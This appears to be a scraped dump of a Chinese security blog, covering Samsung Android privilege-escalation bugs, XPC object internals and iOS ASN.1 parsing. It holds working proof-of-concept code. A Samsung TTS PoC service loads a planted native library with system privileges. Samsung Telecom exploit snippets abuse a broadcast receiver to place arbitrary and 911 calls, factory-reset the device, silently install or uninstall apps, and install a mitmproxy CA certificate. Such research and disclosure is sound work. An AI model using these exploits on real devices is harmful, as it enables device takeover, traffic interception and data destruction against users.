1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package com.samsung.SMT.lang.poc;import android.app.Service;import android.content.Intent;import android.os.IBinder;import android.util.Log;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.util.ArrayList;public class MyService extends Service { public MyService() { } public void copyfile(String input, String output) throws IOException { OutputStream myOutput = new FileOutputStream(output); byte[] buffer = new byte[1024]; int length; InputStream myInput = new FileInputStream(input); while ((length = myInput.read(buffer)) &gt; 0) { myOutput.write(buffer, 0, length); } myInput.close(); myOutput.flush(); myOutput.close(); } @Override public void onCreate() { super.onCreate(); final String input = this.getApplicationInfo().nativeLibraryDir + &quot;/&quot; + &quot;libmstring.so&quot;; final String output = &quot;/data/data/com.samsung.SMT.lang.poc/libmstring.so&quot;; Thread thread = new Thread(new Runnable() { @Override public void run() { try { copyfile(input, output); Runtime.getRuntime().exec(&quot;chmod 777 &quot; + output); } catch (IOException e) { e.printStackTrace(); } try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Intent bi = new Intent(); bi.setAction(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;); ArrayList&lt;CharSequence&gt; s = new ArrayList&lt;&gt;(); bi.putCharSequenceArrayListExtra(&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;, s); bi.putExtra(&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;, &quot;99999&quot;); bi.putCharSequenceArrayListExtra(&quot;BROADCAST_DB_FILELIST&quot;, s); bi.putExtra(&quot;SMT_ENGINE_VERSION&quot;, 0x2590cd5b);//installed version is 361811291 bi.putExtra(&quot;SMT_ENGINE_PATH&quot;, input); sendBroadcast(bi); } }); thread.start(); } @Override public IBinder onBind(Intent intent) { return null; }}","link":"/2022/06/14/Samsung-TTS-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2019-16253/"},{"title":"XPC逆向","text":"原文链接：https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects 前言XPC是macOS/iOS中使用的加强版IPC，自10.7/5.0版本引入。 API本身分为对象API和传输API，XPC通过libxpc.dylib提供自己的数据类型，如下所示： 从 C API 的角度来看，所有对象都只是“xpc_object_t”。实际类型可以由函数 xpc_get_type(xpc_object_t) 动态确定。所有数据类型都可以使用相应的 xpc_objectType_create 函数创建，并且所有这些函数都调用函数 _xpc_base_create(Class, Size)，size是指定对象的大小，class是基类_OS_xpc_type_ *中的一个。可以在IDA或Hopper中查看哪些函数调用了_xpc_base_create(Class, Size)。 Hopper自动化查询脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041def get_last2instructions_addr(seg, x): last1ins_addr = seg.getInstructionStart(x - 1) last2ins_addr = seg.getInstructionStart(last1ins_addr - 1) last2ins = seg.getInstructionAtAddress(last2ins_addr) last1ins = seg.getInstructionAtAddress(last1ins_addr) print hex(last2ins_addr), last2ins.getInstructionString(), last2ins.getRawArgument(0), last2ins.getRawArgument(1) print hex(last1ins_addr), last1ins.getInstructionString(), last1ins.getRawArgument(0), last1ins.getRawArgument(1) return last2ins,last1insdef run(): print '[*] Demonstrating XPC ojbect sizes using a hopper diassembler\\'s python script' xpc_object_sizes_dict = dict() doc = Document.getCurrentDocument() _xpc_base_create_addr = doc.getAddressForName('__xpc_base_create') for i in range(doc.getSegmentCount()): seg = doc.getSegment(i) #print '[*]'+ seg.getName() if('__TEXT' == seg.getName()): eachxrefs = seg.getReferencesOfAddress(_xpc_base_create_addr) for x in eachxrefs: last2ins,last1ins = get_last2instructions_addr(seg,x) p = seg.getProcedureAtAddress(x) p_entry_addr = p.getEntryPoint() pname = seg.getNameAtAddress(p_entry_addr) x_symbol = pname + '+' + hex(x - p_entry_addr) print hex(x),'(' + x_symbol + ')' ins0 = seg.getInstructionAtAddress(x - 5) ins1 = seg.getInstructionAtAddress(x - 12) if last2ins.getInstructionString() == 'mov' and last1ins.getInstructionString() == 'lea': if last2ins.getRawArgument(0) == 'esi' and last1ins.getRawArgument(0) == 'rdi': indirect_addr = int(last1ins.getRawArgument(1)[7:-1],16) xpcObj_len = last2ins.getRawArgument(1) callerinfo = '__xpc_base_create('+ doc.getNameAtAddress(indirect_addr)+',' + xpcObj_len+ ');' if callerinfo not in xpc_object_sizes_dict.keys(): xpc_object_sizes_dict[callerinfo] = '#from ' + x_symbol else: xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + ',' + x_symbol print callerinfo #xpc_object_sizes_list.append(callerinfo) elif last2ins.getInstructionString() == 'lea' and last1ins.getInstructionString() == 'mov': if last2ins.getRawArgument(0) == 'rdi' and last1ins.getRawArgument(0) == 'esi': indirect_addr = int(last2ins.getRawArgument(1)[7:-1],16) xpcObj_len = last1ins.getRawArgument(1) callerinfo = '__xpc_base_create('+ doc.getNameAtAddress(indirect_addr)+',' + xpcObj_len+ ');' if callerinfo not in xpc_object_sizes_dict.keys(): xpc_object_sizes_dict[callerinfo] = '#from ' + x_symbol else: xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + ',' + x_symbol print callerinfo #xpc_object_sizes_list.append(callerinfo) elif last2ins.getInstructionString() == 'lea' and last1ins.getInstructionString() == 'lea': if last2ins.getRawArgument(0) == 'rsi' and last1ins.getRawArgument(0) == 'rdi': indirect_addr = int(last1ins.getRawArgument(1)[7:-1],16) xpcObj_len = last2ins.getRawArgument(1)[7:-1] callerinfo = '__xpc_base_create('+ doc.getNameAtAddress(indirect_addr)+',' + xpcObj_len+ ');' if callerinfo not in xpc_object_sizes_dict.keys(): xpc_object_sizes_dict[callerinfo] = '#from ' + x_symbol else: xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + ',' + x_symbol print callerinfo #xpc_object_sizes_list.append(callerinfo) elif last2ins.getRawArgument(0) == 'rdi' and last1ins.getRawArgument(0) == 'rsi': indirect_addr = int(last2ins.getRawArgument(1)[7:-1],16) xpcObj_len = last1ins.getRawArgument(1)[7:-1] callerinfo = '__xpc_base_create('+ doc.getNameAtAddress(indirect_addr)+',' + xpcObj_len+ ');' if callerinfo not in xpc_object_sizes_dict.keys(): xpc_object_sizes_dict[callerinfo] = '#from ' + x_symbol else: xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + ',' + x_symbol print callerinfo #xpc_object_sizes_list.append(callerinfo) print '____________________________________________________________' dict_len = len(xpc_object_sizes_dict) print '[*] Total of XPC object: %d' % dict_len for key in xpc_object_sizes_dict.keys(): print key, xpc_object_sizes_dict[key]if __name__ == '__main__': run() 由脚本可以知道所有的XPC对象的大小，_xpc_base_create()函数的实现： 1234567__text:0000000000003538 __xpc_base_create proc near ; CODE XREF: __xpc_array_copy+1E↓p__text:0000000000003538 ; __xpc_array_deserialize+72↓p ...__text:0000000000003538 ; __unwind {__text:0000000000003538 add rsi, 18h__text:000000000000353C jmp __os_object_alloc_realized__text:000000000000353C ; } // starts at 3538__text:000000000000353C __xpc_base_create endp 也就是所有XPC对象的大小等于size+0x18，然后来检查所有对象的内存布局。 具体分析xpc_int64_t我们使用函数 xpc_int64_create 创建一个 xpc_int64_t 对象，如下所示： 下面是LLDB中对象xpc_int64_t的内存布局: 对象 xpc_uint64_t 的结构如下所示: xpc_uint64_t使用函数 xpc_uint64_create 创建一个 xpc_uint64_t 对象，如下所示: 可以看到返回值不是有效的内存地址。它应该通过对输入参数进行一些算术运算来生成。在这种情况下，它直接使用一个 64 位无符号整数来表示对象 xpc_uint64_t: 看另一个创建 xpc_uint64_t 对象的案例: 下面是LLDB中对象xpc_uint64_t的内存布局: 可以看到返回值指向的内存缓冲区代表对象 xpc_uint64_t 并且给定的输入参数位于偏移量 0x18 处。 接下来，让我们深入了解函数 xpc_uint64_create 的实现。下面是它的实现： 在这个函数中，它首先对参数进行 52 位的逻辑右移。 a) 如果结果不等于 0，则调用函数 _xpc_base_create 来创建 XPC 对象。然后它将 0x08（4 字节长度）写入缓冲区 0x14 处的偏移量。最后，它还将参数（8 字节长度）写入缓冲区 0x18 处的偏移量。 b) 如果结果等于 0 并且全局变量 objc_debug_taggedpointer_mask 不为零，则它通过 (value &lt;&lt; 0xc | 0x4f) ^ objc_debug_taggedpointer_obfuscator 进行算术运算。在调试器 LLDB 中，我们可以看到变量 objc_debug_taggedpointer_obfuscator 等于 0x5de9b03e5c731aae。所以算术运算的结果等于 0x5de9b42a48670ae1。该值是函数_xpc_uint64_create 的返回值。如果结果为零，则与 (a.) 相同 我们可以看一下全局变量objc_debug_taggedpointer_mask和objc_debug_taggedpointer_obfuscator的值。 一旦我们有了变量 objc_debug_taggedpointer_obfuscator 的值，我们就可以计算返回值。 全局变量objc_debug_taggedpointer_obfuscator 对于每个新流程实例都是随机的。现在让我们追踪它是如何生成的以及它来自哪里。 我们可以看到变量 objc_debug_taggedpointer_obfuscator 实际上是库 libobjc.A.dylib 中的一个全局变量。以下代码（位于 objc4-750/runtime/objc-runtime-new.mm 中）用于随机初始化 objc_debug_taggedpointer_obfuscator。 最后总结一下对象xpc_uint64_t的结构如下: xpc_uuid_t我们使用函数 xpc_uuid_create 创建一个 xpc_uuid_t 对象（UUID：通用唯一标识符），如下所示： 下面是LLDB中对象xpc_uuid_t的内存布局： 可以很容易地根据内存布局推算出对象 xpc_uuid_t 的结构： xpc_double_t我们使用函数 xpc_double_create 创建一个 xpc_double_t 对象，如下所示： 下面是LLDB中对象xpc_double_t的内存布局： 对象 xpc_double_t 的结构如下所示： xpc_date_t我们使用函数 xpc_date_create 创建一个 xpc_date_t 对象，如下所示： 下面是LLDB中对象xpc_date_t的内存布局： 对象 xpc_date_t 的结构如下所示： xpc_string_t使用函数 xpc_string_create 创建一个 xpc_string_t 对象，如下所示： 下面是LLDB中对象xpc_string_t的内存布局： 对象 xpc_string_t 的结构如下所示： xpc_array_t我们使用函数 xpc_array_create 创建一个 xpc_array_t 对象，如下所示： 在这个例子中，我们首先创建一个 xpc_array_t 对象，然后将三个值附加到数组中。下面是 xpc_array_create 函数的声明： xpc_array_create函数的实现： 我们可以看到数组的容量等于(count2+0x08)，存储在偏移量0x1c(四个字节)处。指向已分配缓冲区的指针存储在偏移量 0x20 处。分配的缓冲区大小等于(count2+0x8)*0x8。 然后我们可以检查这个对象在 LLDB 中的内存布局，如下所示： 数组的长度存储在偏移量 0x18（四个字节）处。偏移量 0x20 处的指针指向分配的 xpc_object_t 缓冲区，该缓冲区存储数组中的所有元素（xpc_object_t）。对象 xpc_array_t 的结构如下所示： xpc_data_t我们使用函数 xpc_data_create 创建一个 xpc_data_t 对象，如下所示： 下面是LLDB中对象xpc_data_t的内存布局： 如果数据缓冲区的长度小于等于0x4000，则偏移0x14处的值等于(length+0x7)&amp;0xfffffffc，否则为0x04，对象 xpc_data_t 的结构如下所示： xpc_dictionary_txpc_dictionary_t 类型在 XPC 中扮演着重要的角色。所有消息都作为字典在端点之间传递，这使得序列化/反序列化变得容易。xpc_dictionary_t 的内部结构比其他原始类型更复杂。 使用函数 xpc_dictionary_create 创建一个 xpc_dictionary_t 对象，如下所示： 下面是LLDB中xpc_dictionary_t对象的内存布局： 字段 hash_buckets 是一个长度为 7 的数组。 hash_buckets[7] 中的每个元素都存储 XPC 字典链表条目。这里我们以 hash_buckets[3] 为例来检查它的内存布局。 我们可以确定 XPC 字典链表条目的结构如下： xpc_dictionary_t对象的结构如下： 结语XPC 还提供了xpc_copy_description(xpc_object_t) API 用于生成任何 XPC 对象的人类可读的字符串描述，这对于转储消息特别有用。例如，当我们使用给定的 xpc_dictionary_t 对象参数调用此 API 时，以下是此 xpc_dictionary_t 对象的字符串描述的输出。通过它很容易识别出这个对象的内部元素的值。 在xpc_copy_description(xpc_object_t)的实现中，可以调用描述函数（_xpc_TYPE_desc或_xpc_TYPE_debug_desc）来获得这个XPC对象的字符串描述。这两个描述函数的地址分别位于相应的_OS_xpc_TYPE类中的偏移量0x58和0x60，如下所示：","link":"/2021/12/20/XPC%E9%80%86%E5%90%91/"},{"title":"XNU: turnstile use after free(CVE-2021-30916)","text":"","link":"/2022/01/11/XNU-turnstile-use-after-free-CVE-2021-30916/"},{"title":"Samsung Telecom漏洞","text":"影响范围Samsung Android9至Android12。 漏洞影响允许发送恶意Intent，这些Intent将被com.android.server.telecom(System权限)执行，以启动指定的应用程序组件(无论是否设置导出)。Android9的利用条件可能会更加宽松，可能允许不具有任何权限的应用程序发送任意Intent至telecom的广播接收器。Android10、11、12则是通过activity组件。 恶意应用可以借此获取system权限，能够进行恢复出厂设置、安装卸载任意app、呼叫任意号码，以及安装自定义证书。 漏洞原理根据exp可知，问题应该是在telecom对应com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL的广播接收器中。可以通过pm命令获取到telecom安装位置，然后使用jeb或jadx进行分析。 直接在AndroidManifest文件中搜索USER_SELECT_WIFI_SERVICE_CALL是找不到的，所以该广播接收器应该不是静态注册的。 使用jadx搜索USER_SELECT_WIFI_SERVICE_CALL，发现有两处代码。 com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsAlertActivity 发送广播 12345678private void notifyUserSelectWifiServiceCall(Intent intent) { SamsungLogger.i(TAG, &quot;notifyUserSelectWifiServiceCall&quot;); intent.putExtra(&quot;is_skip_usa_wps_alert&quot;, true); Intent intent2 = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;); intent2.putExtra(&quot;extra_call_intent&quot;, intent); sendBroadcast(intent2); } com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsManager 1234567891011121314151617181920212223242526272829303132333435363738class SamsungUsaWpsManager { private static final String TAG = &quot;SamsungUsaWpsManager&quot;; private BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() { /* class com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsManager.AnonymousClass1 */ public void onReceive(Context context, Intent intent) { if (&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;.equals(intent.getAction())) { Intent intent2 = (Intent) intent.getParcelableExtra(&quot;extra_call_intent&quot;); boolean areNoCallsPresent = SamsungUsaWpsManager.this.mSamsungUsaWpsHelper.areNoCallsPresent(); boolean WIRELESS_PRIORITY_SERVICE_3WAYCALL = SamsungUsaWpsManager.this.mSamsungFeatureRepository.WIRELESS_PRIORITY_SERVICE_3WAYCALL(); String str = SamsungUsaWpsManager.TAG; SamsungLogger.i(str, &quot;onReceive - areNoCallsPresent: &quot; + areNoCallsPresent + &quot;, isFeatureEnabled: &quot; + WIRELESS_PRIORITY_SERVICE_3WAYCALL); if (areNoCallsPresent || WIRELESS_PRIORITY_SERVICE_3WAYCALL) { SamsungUsaWpsManager.this.mSamsungUsaWpsHelper.setCallIntent(intent2); SamsungUsaWpsManager.this.mSamsungUsaWpsHelper.wirelessPriorityServiceCall(); return; } SamsungUsaWpsManager.this.mSamsungUsaWpsHelper.setCallIntent(intent2); SamsungUsaWpsManager.this.mCallsManager.disconnectAllCalls(SamsungUsaWpsManager.TAG); SamsungUsaWpsManager.this.mCallsManager.addListener(SamsungUsaWpsManager.this.mSamsungUsaWpsCallsManagerListener); } } }; private final CallsManager mCallsManager; private final Context mContext; private final SamsungFeatureRepository mSamsungFeatureRepository; private final SamsungUsaWpsCallsManagerListener mSamsungUsaWpsCallsManagerListener; private final SamsungUsaWpsHelper mSamsungUsaWpsHelper; SamsungUsaWpsManager(Context context, CallsManager callsManager, SamsungFeatureRepository samsungFeatureRepository, SamsungUsaWpsCallsManagerListener samsungUsaWpsCallsManagerListener, SamsungUsaWpsHelper samsungUsaWpsHelper) { this.mContext = context; this.mCallsManager = callsManager; this.mSamsungFeatureRepository = samsungFeatureRepository; this.mSamsungUsaWpsCallsManagerListener = samsungUsaWpsCallsManagerListener; this.mSamsungUsaWpsHelper = samsungUsaWpsHelper; this.mContext.registerReceiver(this.mBroadcastReceiver, new IntentFilter(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;)); }} 无论areNoCallsPresent和WIRELESS_PRIORITY_SERVICE_3WAYCALL的值如何，都要执行： 1SamsungUsaWpsManager.this.mSamsungUsaWpsHelper.setCallIntent(intent2); 跟进去： 12345678910111213141516171819202122232425262728293031323334public class SamsungUsaWpsHelper { private static final String TAG = &quot;SamsungUsaWpsHelper&quot;; private Intent mCallIntent; private final CallsManager mCallsManager; private final Context mContext; private final SamsungTelecomManagerAdapter mSamsungTelecomManagerAdapter; SamsungUsaWpsHelper(Context context, CallsManager callsManager, SamsungTelecomManagerAdapter samsungTelecomManagerAdapter) { this.mContext = context; this.mCallsManager = callsManager; this.mSamsungTelecomManagerAdapter = samsungTelecomManagerAdapter; } /* access modifiers changed from: package-private */ public void setCallIntent(Intent intent) { this.mCallIntent = intent; // 这里赋值 } /* access modifiers changed from: package-private */ public boolean areNoCallsPresent() { return Optional.ofNullable(this.mCallsManager).map($$Lambda$SqQBZEzdLaU65eG7w4yg3b_2uc.INSTANCE).filter($$Lambda$2ohHFGmFtjY8BkLpMKvqr9gewzA.INSTANCE).isPresent(); } /* access modifiers changed from: package-private */ public void wirelessPriorityServiceCall() { if (this.mCallIntent != null) { SamsungLogger.m3i(TAG, &quot;wirelessPriorityServiceCall&quot;); this.mCallIntent.setFlags(268435456); // 0x10000000 =&gt; FLAG_ACTIVITY_NEW_TASK this.mSamsungTelecomManagerAdapter.makeCall(this.mContext, this.mCallIntent, TAG); // 这里调起 return; } SamsungLogger.m3i(TAG, &quot;wirelessPriorityServiceCall, call intent is null&quot;); }} 至此，漏洞就分析完了，其实就是telecom直接为extra_call_intent中的Intent创建了新的activity task，但是在创建之前，却没有任何判读。 exp拨打任意电话12345Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(&quot;tel:+17031234567&quot;));Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent); 拨打特权电话12345Intent intent = new Intent(&quot;android.intent.action.CALL_PRIVILEGED&quot;, Uri.parse(&quot;tel:911&quot;));Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent); 立即恢复出厂设置1234567Intent intent = new Intent();intent.setClassName(&quot;com.sec.factory&quot;, &quot;com.sec.factory.sysdump.FactoryReset&quot;);intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent); 卸载任意App12345678910111213141516171819Intent intent = new Intent();intent.setClassName(&quot;com.samsung.android.packageinstaller&quot;, &quot;com.android.packageinstaller.UninstallUninstalling&quot;);PackageManager packageManager = context.getPackageManager();ApplicationInfo app = packageManager.getApplicationInfo(&quot;jackpal.androidterm&quot;, 0);intent.putExtra(&quot;com.android.packageinstaller.applicationInfo&quot;, app);intent.putExtra(&quot;android.content.pm.extra.PACKAGE_NAME&quot;, &quot;jackpal.androidterm&quot;);intent.putExtra(&quot;android.intent.extra.UNINSTALL_ALL_USERS&quot;, false);intent.putExtra(&quot;android.intent.extra.RETURN_RESULT&quot;, false);intent.putExtra(&quot;android.content.pm.extra.LEGACY_STATUS&quot;, 1);intent.putExtra(&quot;com.android.packageinstaller.extra.KEEP_DATA&quot;, false);intent.putExtra(&quot;com.android.packageinstaller.extra.APP_LABEL&quot;, &quot;Terminal Emulator&quot;);intent.putExtra(Intent.EXTRA_USER, android.os.Process.myUserHandle());intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent); 安装任意App1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162File local_apk_file = new File(getFilesDir(), &quot;term.apk&quot;);if (local_apk_file.exists())local_apk_file.delete();AssetManager assetManager = getAssets();InputStream inputStream = assetManager.open(&quot;term.apk&quot;);OutputStream outputStream = new FileOutputStream(local_apk_file);byte[] buffer = new byte[65536];int read;while((read = inputStream.read(buffer)) != –1){outputStream.write(buffer, 0, read);}inputStream.close();outputStream.close();PackageInstaller pi = getPackageManager().getPackageInstaller();int sessionId = pi.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));String temp_apk_path = &quot;/data/app/vmdl&quot; + sessionId + &quot;.tmp/base.apk&quot;;Log.i(TAG, &quot;Session is &quot; + sessionId + &quot; – so path should be &quot; + temp_apk_path);PackageInstaller.Session session = pi.openSession(sessionId);long sizeBytes = local_apk_file.length();InputStream in = new FileInputStream(local_apk_file);OutputStream out = session.openWrite(&quot;base.apk&quot;, 0, sizeBytes);int bytes_read =0;while ((bytes_read = in.read(buffer)) != –1) {out.write(buffer, 0, bytes_read);}session.fsync(out);in.close();out.close();// Intent pi_intent = new Intent(getApplicationContext(), YoloReceiver.class);// PendingIntent alarmtest = PendingIntent.getBroadcast(getApplicationContext(), 1887111117, pi_intent, // // PendingIntent.FLAG_UPDATE_CURRENT);// IntentSender statusReceiver = alarmtest.getIntentSender();// session.commit(statusReceiver);// session.close();Intent intent = new Intent();intent.setClassName(&quot;com.samsung.android.packageinstaller&quot;, &quot;com.android.packageinstaller.InstallInstalling&quot;);intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);File apkFile = new File(temp_apk_path);Uri apkUri = Uri.fromFile(apkFile);intent.setData(apkUri);intent.putExtra(Intent.EXTRA_USER, android.os.Process.myUserHandle());PackageInfo packageInfo = context.getPackageManager().getPackageArchiveInfo(local_apk_file.getPath(), PackageManager.GET_PERMISSIONS);intent.putExtra(&quot;com.android.packageinstaller.applicationInfo&quot;, packageInfo.applicationInfo);Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent);Thread.sleep(3333);Intent home_screen_intent = new Intent(&quot;android.intent.action.MAIN&quot;);home_screen_intent.addCategory(&quot;android.intent.category.HOME&quot;);home_screen_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(home_screen_intent); 安装任意证书123456789101112131415161718192021222324252627282930313233343536373839404142String CERTIFICATE = &quot;—–BEGIN CERTIFICATE—–\\n&quot; + &quot;MIIDoTCCAomgAwIBAgIGDopToKRIMA0GCSqGSIb3DQEBCwUAMCgxEjAQBgNVBAMM\\n&quot; + &quot;CW1pdG1wcm94eTESMBAGA1UECgwJbWl0bXByb3h5MB4XDTIwMDgyNzE4NTIxMVoX\\n&quot; + &quot;DTIzMDgyOTE4NTIxMVowKDESMBAGA1UEAwwJbWl0bXByb3h5MRIwEAYDVQQKDAlt\\n&quot; + &quot;aXRtcHJveHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC6PUKSC32x\\n&quot; + &quot;mzSjxXqcOP9jvm9wBpnTXaJZF0Fmy9qPc0yycgaZ6KZZpw+MXwzr2LAthK7yQCUy\\n&quot; + &quot;6W2VGS6gZwCz5Cx1gBdI8URjhAoYvUA3GEuH/ZfqET4UzFrmvIqSIWuY1e/ddTjn\\n&quot; + &quot;t4PoRKHC2ZrRo9AeG4Nehsr0GPaJ2Eay4nBTjGlRtuKYVRb3CEmOIfXhxmyWI87c\\n&quot; + &quot;S4q2E9gMfJTO0I+ceWWNb3Qm7TyqI3iuLhdWIGEMjQ/2ghmyIMkt7+tyMUzskSVR\\n&quot; + &quot;nP7Mrm6ZIVhzpzhjzdAoxkcsUHqwge13JknqzFIwH7z63hJYcqY7pdE+wUWnIpXB\\n&quot; + &quot;UWHSIBJE64qLAgMBAAGjgdAwgc0wDwYDVR0TAQH/BAUwAwEB/zARBglghkgBhvhC\\n&quot; + &quot;AQEEBAMCAgQweAYDVR0lBHEwbwYIKwYBBQUHAwEGCCsGAQUFBwMCBggrBgEFBQcD\\n&quot; + &quot;BAYIKwYBBQUHAwgGCisGAQQBgjcCARUGCisGAQQBgjcCARYGCisGAQQBgjcKAwEG\\n&quot; + &quot;CisGAQQBgjcKAwMGCisGAQQBgjcKAwQGCWCGSAGG+EIEATAOBgNVHQ8BAf8EBAMC\\n&quot; + &quot;AQYwHQYDVR0OBBYEFKvNgPJA8o638r3x82ocg0HjW5B0MA0GCSqGSIb3DQEBCwUA\\n&quot; + &quot;A4IBAQAsperz2qaBMu/MnmSaV2x6LFWYMXcJKXJR3vrrmPcQ3F5pUBFwQuhp+5jj\\n&quot; + &quot;1wfF38rcYsfNidiRIPztHtbTsQzKCTF2Gwy5aRK4uR9bM5UguACo7C9Q35N31FG2\\n&quot; + &quot;/x3T3UMvZrqUOt5dJGuxUTXZAWoRikQw7rHfpVftxDjFCBrVmVlDdGqGdPBMAJsJ\\n&quot; + &quot;5MCR01mNKxO385voXCQQYW1pFG0RdUTucqSl2YjXe7UjD8rov34ljR2qAu5KImDm\\n&quot; + &quot;FhzLdPqUZAZuCWTBbxQantRRV11k/QdlVTamyILFSXlkMT2Ral7t6YxMXmd4KBqm\\n&quot; + &quot;vzGsCb5scuW4h/ua/IzHHAR3ryia\\n&quot; + &quot;—–END CERTIFICATE—–&quot;;Intent intent = new Intent(&quot;android.credentials.INSTALL&quot;);intent.setClassName(&quot;com.android.certinstaller&quot;, &quot;com.android.certinstaller.CertInstaller&quot;);byte[] pemBytes = Base64.decode( CERTIFICATE.replaceAll(&quot;—–(BEGIN|END) CERTIFICATE—–&quot;, &quot;&quot;) .replaceAll(&quot;\\n&quot;, &quot;&quot;) .getBytes(&quot;UTF-8&quot;), Base64.DEFAULT);intent.putExtra(KeyChain.EXTRA_CERTIFICATE, pemBytes);intent.putExtra(KeyChain.EXTRA_NAME, &quot;yolo&quot;);intent.putExtra(Intent.EXTRA_REFERRER, &quot;com.android.settings&quot;);intent.putExtra(&quot;certificate_install_usage&quot;, &quot;ca&quot;);intent.putExtra(&quot;install_as_uid&quot;, &quot;1000&quot;);intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);Intent broad_intent = new Intent(&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;);broad_intent.putExtra(&quot;extra_call_intent&quot;, intent);sendBroadcast(broad_intent);","link":"/2022/04/17/Samsung-Telecom%E6%BC%8F%E6%B4%9E/"},{"title":"iOS ASN.1 漏洞(CVE-2021-30737)","text":"背景知识ASN.1编码ASN.1是一种Type-Length-Value序列化格式，ASN.1有一个特性，即，如果不知道值的长度，ASN.1仍能对它进行序列化，但是需要ASN.1按照基本编码规则(BER)进行编码。有一种更严格的编码叫区分编码规则(DER)，它强制要求一个特定的值只有一个正确的编码，并且不允许在不知道最终长度的情况下序列化值。 ASN.1指南 这里仅介绍漏洞所需的ASN.1知识。 第一个是类型，其中5位定义了类型标识符。0x1f表示类型标识符不能在这5位中表示，需要其他的表示方法，而是以不同的方式进行编码。 第一个字节的前两位表示该类型的类别：universal、application、content-specific或private。对我们来说，设置为0（universal）。 第6位如果为1，就说明这是一个原始编码，也就是说，在长度后面是可以直接解释为预定类型的内容。例如，作为ASN.1可打印字符串的 “HELLO”的原始编码将有一个长度为5的字节，后面是ASCII字符 “HELLO”。 第6位的值为0，表示这是一个构建的编码。这意味着长度后面的字节是一个或多个 “块 “的ASN.1编码，需要单独解析和串联以形成最终的输出值。还可以指定一个长度值为0，这意味着甚至不知道重建的输出会有多长，或者需要多少后续输入来完全建立输出。 这种最后的情况（长度不确定的构造类型）被称为不确定的形式。构成单个不确定值的输入的结束是由一个序列化的类型发出的信号，该类型的标识符、构造、类和长度值都等于0，它被编码为两个NULL字节。 ASN.1 bitstrings大多数ASN.1字符串类型不需要特殊处理，只是原始字节。它们中的一些有长度限制。例如：BMP字符串必须是偶数长度，UNIVERSAL字符串的长度必须是4字节的倍数，但仅此而已。 ASN.1比特串是比特的字符串，而不是字节的字符串。例如，可以有一个长度为一个比特的比特串（所以要么是0，要么是1）或者一个长度为127比特的比特串（所以是15个完整的字节加上一个额外的7比特。） 编码后的ASN.1比特串在长度之后、内容之前有一个额外的元数据字节，它编码了最后一个字节中未使用的比特数。 ASN.1解析ASN.1数据总是需要与模板一起解码，模板告诉解析器应该期待什么数据，还提供输出指针，以填入解析后的输出数据。下面是一个例子： 123456789101112131415161718const SecAsn1Template simple_bitstring_template[] = { { SEC_ASN1_BIT_STRING | SEC_ASN1_MAY_STREAM, // kind: bit string, // may be constructed 0, // offset: in dest/src NULL, // sub: subtemplate for indirection sizeof(SecAsn1Item) // size: of output structure }};SecAsn1Item decoded = {0};PLArenaPool* pool = PORT_NewArena(1024);SECStatus status = SEC_ASN1Decode(pool, // pool: arena for destination allocations &amp;decoded, // dest: decoded encoded items in to here &amp;simple_bitstring_template, // template asn1_bytes, // buf: asn1 input bytes asn1_bytes_len); // len: input size NSS ASN.1 状态机该状态机有两个核心数据结构。 - SEC_ASN1DecoderContext - 整体的解析环境。 sec_asn1d_state - 一个单一的解析器状态，保存在一个双链接的列表中，形成一个嵌套状态的堆栈。 部分字段如下： 123456789101112typedef struct sec_asn1d_state_struct { SEC_ASN1DecoderContext *top; const SecAsn1Template *theTemplate; void *dest; struct sec_asn1d_state_struct *parent; struct sec_asn1d_state_struct *child; 